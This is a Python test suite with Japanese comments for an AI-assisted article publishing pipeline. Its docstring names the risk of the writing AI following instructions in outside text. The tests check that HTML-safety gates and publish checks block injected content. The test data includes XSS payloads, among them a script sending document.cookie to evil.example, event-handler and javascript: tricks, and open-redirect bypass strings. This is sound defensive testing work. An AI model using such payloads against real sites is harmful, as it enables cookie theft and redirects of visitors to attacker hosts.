# -*- coding: utf-8 -*-
"""2026-10-11 点検の指摘5・7（記事を書く AI が外の文章の指示に従っても、本番の画面と配信が守られるように）。

指摘5: publish.py --check は配信の手前の門だけを通して PUBLISH_CHECK=ok を返すが、その社に無い場所へのリンク（/lp/）・
  雛形の未置換タグになる印・先方の変換が止める形は、return の後ろ（書き出しの中）でしか見ていなかった。--check は通って
  AI のいない配信で止まり、直されない。作業コピーの要らない門は --check の側へ移し、監修待ち（HELD）は最後に返す。
指摘7: 記事の本文・題・説明・FAQ に ld+json 以外の script・on 属性・iframe・外部への form・javascript: の URL・
  自動の転送を入れても、変換（md2html）も雛形もそのまま通し、どの検査も止めなかった。site/_redirects も転送元しか
  見ておらず、相談先を外へ転送できた。判定を scripts/html_safety.py の1か所に置き、build.py（公開済みも止める）・
  publish.py（全方式）・score_check（書く段）・seo_audit（転送。--gate で公開しない）・build.py（転送）が呼ぶ。
架空の社（zz.example）で試す。お客様の社の名前・記事の題・slug は書かない。
"""
import contextlib
import io
import json
import re
import shutil
import sys
import tempfile
from pathlib import Path

from test_gates import check, ROOT

sys.path.insert(0, str(ROOT / "scripts"))

_FM = ("---\ntitle: {title}\ndescription: " + "試験の社の記事の説明です。予約と料金の考え方をまとめます。" * 3
       + "\nslug: {slug}\nkeyword: 試験 予約\ncategory: {cat}\ndate: 2026-10-01\n"
       "score: 95\nscore_breakdown: {{originality: 95, extractability: 95, decision: 95}}\n---\n\n")


def _body(extra=""):
    return "\n\n".join(f"## 見出し{i}\n\n" + "予約を増やすには、診療の内容と料金を先に示します。" * 6
                       for i in range(6)) + "\n\n" + extra + "\n"


def test_html_safety_finds_dangerous_html_and_leaves_normal_html():
    print("\n■ 入れてはいけない HTML（script・on 属性・iframe・外部への form・javascript:・自動の転送）を1か所で見る")
    import html_safety as HS

    def kinds(body, raw=False, meta=None):
        return sorted({k for k, _ in HS.article_problems(meta or {}, body, raw=raw)})
    bad = {
        "外部のスクリプト": ('<script src="https://evil.example/x.js"></script>', ["script"]),
        "中身のあるスクリプト": ("<script>fetch('https://evil.example/?c='+document.cookie)</script>", ["script"]),
        "ld+json と名乗って src で読む": ('<script type="application/ld+json" src="https://evil.example/x"></script>',
                                       ["script"]),
        "onerror": ('<img src="x" alt="図" onerror="location=\'https://evil.example\'">', ["on"]),
        "details の ontoggle": ("<details open ontoggle=alert(1)><summary>Q</summary></details>", ["on"]),
        "見出しの属性の記法（{: onclick }）": ('## 見出し {: onclick="alert(1)" }', ["on"]),
        "iframe": ('<iframe src="https://evil.example/"></iframe>', ["frame"]),
        "object": ('<object data="https://evil.example/x"></object>', ["frame"]),
        "外部への form": ('<form action="https://evil.example/collect"><input name="tel"></form>', ["form"]),
        "formaction": ('<button formaction="https://evil.example/">送る</button>', ["form"]),
        "Markdown の javascript: リンク": ("[ここを押す](javascript:alert(1))", ["url"]),
        "文字参照とタブで隠した javascript:": ('<a href="jav&#x09;ascript:alert(1)">押す</a>', ["url"]),
        "meta の自動転送": ('<meta http-equiv="refresh" content="0;url=https://evil.example/">', ["refresh"]),
        "base": ('<base href="https://evil.example/">', ["base"]),
        "noscript の属性値に隠した onerror": ('<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
                                          ["on"]),
    }
    for name, (snippet, want) in bad.items():
        check(f"止める: {name}", [k for k in kinds(_body(snippet)) if k in want], want)
    fenced = "<div>\n```\n<script src=\"https://evil.example/x.js\"></script>\n```\n</div>"
    check("先方が Markdown のまま変換する社（raw）: <div> の直後のコードの囲みに隠した script を止める"
          "（当社の変換は文字にするが、先方の変換は HTML のまま通す）",
          (kinds(_body(fenced)), kinds(_body(fenced), raw=True)), ([], ["script"]))
    hits = HS.article_problems({}, _body('<iframe src="https://maps.example/?q=zz"></iframe>'))
    check("お客様の記事は例（URL に住所・社名が入りうる）を出さず、種類だけ伝える",
          ("maps.example" in HS.describe(hits), "maps.example" in HS.describe(hits, sample=False),
           "iframe" in HS.describe(hits, sample=False)), (True, False, True))
    check("題の引用符で属性から抜ける on 属性・FAQ の </script> も止める",
          (kinds(_body(), meta={"title": 'x" onmouseover="alert(1)'}),
           kinds(_body(), meta={"faq": [{"q": "Q", "a": "</script><script>alert(1)</script>"}]})),
          (["on"], ["script"]))
    good = {
        "構造化データ（ld+json）": '<script type="application/ld+json">{"@type": "FAQPage"}</script>',
        "コードの囲みの中の script": "```\n<script src=\"https://example.com/x.js\"></script>\n```",
        "語としての onclick": "`onclick=` の属性は使いません。1 < 2 のとき onload= と書く例もあります",
        "/online= を含む出典の URL": "[出典](https://www.example.go.jp/online=1/)",
        "外部の出典リンク（新しいタブ）": '<a href="https://www.mhlw.go.jp/" target="_blank" rel="noopener">厚生労働省</a>',
        "サイトの中・自社への form": '<form action="/contact/"></form><form action="https://ai.7senses.co.jp/lp/"></form>',
        "FAQ・定義の枠・表": ('<details><summary>Q</summary><p>A</p></details>\n\n<div class="definition-box">'
                          '<span class="term">定義</span></div>\n\n| a | b |\n|:--|:--|\n| 1 | 2 |'),
    }
    for name, snippet in good.items():
        check(f"止めない: {name}", (kinds(_body(snippet)), kinds(_body(snippet), raw="```" not in snippet)), ([], []))
    import yaml
    flagged = 0
    files = sorted((ROOT / "articles").glob("*.md")) + sorted((ROOT / "private" / "articles").glob("*.md"))
    for p in files:
        m = re.match(r"^---\s*\n(.*?)\n---\s*\n(.*)$", p.read_text(encoding="utf-8-sig"), re.S)
        if m:
            meta = yaml.safe_load(m.group(1)) or {}
            flagged += bool(HS.article_problems(meta if isinstance(meta, dict) else {}, m.group(2), raw=True))
    # お客様の記事も混ざるので、名前は出さず本数だけ見る
    check(f"いまの原稿（{len(files)}本）に当てはまる記事は無い（誤検出しない）", flagged, 0)


def test_redirects_must_stay_inside_own_sites():
    print("\n■ site/_redirects の転送先は、サイトの中（/ で始まる）か自社のドメインだけ")
    import html_safety as HS
    ok = ("# 統合した記事\n/a/ /b/ 301\n/old/* /new/:splat 301\n/c/ https://lp.7senses.co.jp/blog/x/ 301\n"
          "/d/ https://ai.7senses.co.jp/lp/ 302\n")
    check("止めない: サイトの中・自社のドメイン", HS.redirect_problems(ok), [])
    bad = ["/lp/ https://evil.example/ 302", "/x/ //evil.example/ 301", "/y/ /\\evil.example 301",
           "/z/ https://ai.7senses.co.jp.evil.example/ 301", "/w/ https://ai.7senses.co.jp@evil.example/ 301",
           "/v/ https://evil.example\\@ai.7senses.co.jp 301", "/u/ javascript:alert(1) 301", "/t/ https://zz.example/ 301"]
    check("止める: 外のドメイン・//・/\\・自社に見せかけた host・user@・\\・javascript:・お客様のドメイン",
          [n for n, _s, _d in HS.redirect_problems("\n".join(bad))], list(range(1, len(bad) + 1)))
    rd = ROOT / "site" / "_redirects"
    check("いまの site/_redirects に外への転送は無い", HS.redirect_problems(rd.read_text(encoding="utf-8")) if rd.is_file() else [],
          [])
    import seo_audit as SA
    old = (SA.SITE, sys.argv)
    try:
        with tempfile.TemporaryDirectory() as td:
            SA.SITE = Path(td)
            (SA.SITE / "index.html").write_text("<html lang=\"ja\"><head><title>試験</title></head><body></body></html>",
                                                encoding="utf-8")
            (SA.SITE / "_redirects").write_text("/a/ /b/ 301\n", encoding="utf-8")
            rows_ok = [r for r in SA.local()[0] if "転送先" in r[1]]
            (SA.SITE / "_redirects").write_text("/a/ /b/ 301\n/lp/ https://evil.example/ 302\n", encoding="utf-8")
            rows = [r for r in SA.local()[0] if "転送先" in r[1]]
            sys.argv = ["seo_audit.py", "--gate"]
            with contextlib.redirect_stdout(io.StringIO()) as out:
                code = SA.main()
    finally:
        SA.SITE, sys.argv = old
    check("seo_audit: 外への転送は「致命的」（サイトの中だけなら出ない）",
          (rows_ok, [(r[0], r[2]) for r in rows]), ([], [("致命的", "/lp/")]))
    check("seo_audit --gate は公開しない（終了コード2・SEO_GATE=ng）", (code, "SEO_GATE=ng" in out.getvalue()), (2, True))
    src = (ROOT / "scripts" / "build.py").read_text(encoding="utf-8")
    tail = src[src.rindex("html_safety.redirect_problems"):]
    check("build.py も同じ判定で、外への転送があればビルドを失敗で終える",
          ("BLOCKED(公開不可): site/_redirects" in tail, "sys.exit(1)" in tail[:600]), (True, True))


def test_build_and_score_check_stop_dangerous_articles():
    print("\n■ build.py（公開済みも止める）と score_check（書く段）も同じ判定を当てる")
    src = (ROOT / "scripts" / "build.py").read_text(encoding="utf-8")
    loop = src[src.index("import legal_claims"):src.index("paths.append(p)")]
    check("build.py: 記事ごとの門（品質の足切り・表示の決まりと同じ、公開できなくなる側）で html_safety を当てる",
          ("html_safety.article_problems(meta, _body)" in loop, "blocked_metas.append(meta)" in loop.split("html_safety")[-1]),
          (True, True))
    import score_check as SC
    old = SC.ROOT
    try:
        with tempfile.TemporaryDirectory() as td:
            SC.ROOT = Path(td)
            (SC.ROOT / "articles").mkdir()
            for slug, extra in (("h95-sc-bad", '<img src="x" onerror="alert(1)">'), ("h95-sc-ok", "")):
                (SC.ROOT / "articles" / f"{slug}.md").write_text(
                    _FM.format(title="試験の記事の題です（予約）", slug=slug, cat="aio") + _body(extra), encoding="utf-8")
            row = {s: [ok for name, ok, _d, _w in SC.run(s) if name.startswith("入れてはいけない HTML")]
                   for s in ("h95-sc-bad", "h95-sc-ok")}
    finally:
        SC.ROOT = old
    check("score_check: onerror の記事は FAIL（警告ではない）・普通の記事は PASS", row, {"h95-sc-bad": [False], "h95-sc-ok": [True]})


def _tree(td):
    import sites as S
    root = Path(td)
    (root / "sites").mkdir()
    for p in S.SITES_DIR.glob("*.json"):
        shutil.copy(p, root / "sites" / p.name)
    sites = {
        "h95-zzftp": {"id": "h95-zzftp", "name": "試験の社", "domain": "zz.example", "type": "ftp",
                      "url_prefix": "/column", "categories": {"h95-col": "コラム"}},
        "h95-zzmd": {"id": "h95-zzmd", "name": "試験の社（Markdown）", "domain": "zz-md.example", "type": "external-md",
                     "repo": "zz/zz", "branch": "main", "content_dir": "content", "url_prefix": "/journal",
                     "categories": {"h95-jr": "ジャーナル"},
                     "md_dialect": {"name": "journal", "author": "試験 著者", "forbidden": ["禁止語ZZ"]}},
    }
    for sid, cfg in sites.items():
        (root / "sites" / f"{sid}.json").write_text(json.dumps(cfg, ensure_ascii=False), encoding="utf-8")
    (root / "articles").mkdir()
    arts = {
        "h95-lp": ("h95-col", "[無料で相談する](/lp/)"),
        "h95-tag": ("h95-col", "本文に {{TITLE}} が残っています"),
        "h95-js": ("h95-col", '<script src="https://evil.example/x.js"></script>'),
        "h95-ok": ("h95-col", ""),
        "h95-md-ng": ("h95-jr", "この語は禁止語ZZです"),
        "h95-md-ok": ("h95-jr", ""),
    }
    for slug, (cat, extra) in arts.items():
        (root / "articles" / f"{slug}.md").write_text(
            _FM.format(title="試験の社の予約を増やす5つの方法", slug=slug, cat=cat) + _body(extra), encoding="utf-8")
    return root


def test_publish_check_runs_every_gate_that_needs_no_work_copy():
    print("\n■ publish.py --check: 作業コピーの要らない門を全部通してから PUBLISH_CHECK=ok（監修待ちは最後）")
    import deliver_files as DF
    import editorial_review as ER
    import publish as P
    import scaled_guard as SG
    import sites as S
    old = (S.ROOT, S.SITES_DIR, P.ROOT, P.WORK, DF.WORK, SG.check, ER.reviewed, sys.argv)

    def run(site, slug, *flags, reviewed=True):
        ER.reviewed = lambda *a, **k: reviewed
        sys.argv = ["publish.py", "--site", site, "--slug", slug, *flags]
        with contextlib.redirect_stdout(io.StringIO()) as out:
            try:
                P.main()
                res = ""
            except SystemExit as e:
                res = str(e.code)
        return (res + "\n" + out.getvalue()).strip()

    def mark(text):
        if "PUBLISH_CHECK=ok" in text:
            return "ok"
        m = re.match(r"(BLOCKED\(公開不可\)|HELD\(監修待ち\))", text)
        return m.group(1).split("(")[0] if m else text[:60]
    try:
        with tempfile.TemporaryDirectory() as td:
            root = _tree(td)
            S.ROOT, S.SITES_DIR = root, root / "sites"
            P.ROOT, P.WORK, DF.WORK = root, root / ".publish-work", root / ".publish-work"
            SG.check = lambda *a, **k: []
            got = {slug: mark(run(site, slug, "--check")) for site, slug in (
                ("h95-zzftp", "h95-lp"), ("h95-zzftp", "h95-tag"), ("h95-zzftp", "h95-js"), ("h95-zzftp", "h95-ok"),
                ("h95-zzmd", "h95-md-ng"), ("h95-zzmd", "h95-md-ok"))}
            check("--check が止める: その社に無いリンク（/lp/）・雛形の差し込みの印・外部のスクリプト・先方の変換が止める語"
                  "／通す: 普通の記事（FTP の社・先方の変換の社）", got,
                  {"h95-lp": "BLOCKED", "h95-tag": "BLOCKED", "h95-js": "BLOCKED", "h95-ok": "ok",
                   "h95-md-ng": "BLOCKED", "h95-md-ok": "ok"})
            why = run("h95-zzmd", "h95-md-ng", "--check")
            check("止めた理由が AI に分かる（先方の変換・止める語）", ("先方の変換" in why and "禁止語ZZ" in why), True)
            check("監修待ちは最後: 他の門で止まる記事は BLOCKED、門を全部通った記事だけ HELD",
                  (mark(run("h95-zzftp", "h95-lp", "--check", reviewed=False)),
                   mark(run("h95-zzftp", "h95-ok", "--check", reviewed=False))), ("BLOCKED", "HELD"))
            check("配信（--check なし）でも書き出しの前に止める（外部のスクリプト・雛形の差し込みの印）",
                  (mark(run("h95-zzftp", "h95-js")), mark(run("h95-zzftp", "h95-tag")),
                   (root / ".publish-work").exists()), ("BLOCKED", "BLOCKED", False))
            check("配信（--check なし）でも監修待ちは先に返す（これまでどおり）",
                  mark(run("h95-zzftp", "h95-js", reviewed=False)), "HELD")
    finally:
        (S.ROOT, S.SITES_DIR, P.ROOT, P.WORK, DF.WORK, SG.check, ER.reviewed, sys.argv) = old
    src = (ROOT / "scripts" / "publish.py").read_text(encoding="utf-8")
    main_src = src[src.index("def main():"):]
    ret = main_src.index("PUBLISH_CHECK=ok")
    check("publish.py: PUBLISH_CHECK=ok より前に、入れてはいけない HTML・その社に無いリンク・作業コピーの要らない門を置く",
          [main_src.find(k) < ret and main_src.find(k) >= 0 for k in
           ("html_safety.article_problems(", "stop_foreign_links(cfg, meta, body, None if files_type", "pre_problems(cfg, meta, body)")],
          [True, True, True])
    check("配信の書き出し（write_external_md）と --check は同じ手順で先方の変換の形を作る（journal_prepare）",
          (src.count("journal_prepare(cfg, meta, ") >= 2, "def journal_prepare(" in src), (True, True))
    check("publish.py: お客様の記事は止めた理由に例を出さず、slug も伏せる（private_store.shown）",
          ("sample=not sites_mod.is_client(cfg['id'])" in main_src, main_src.count("private_store.shown(args.slug)") >= 2),
          (True, True))
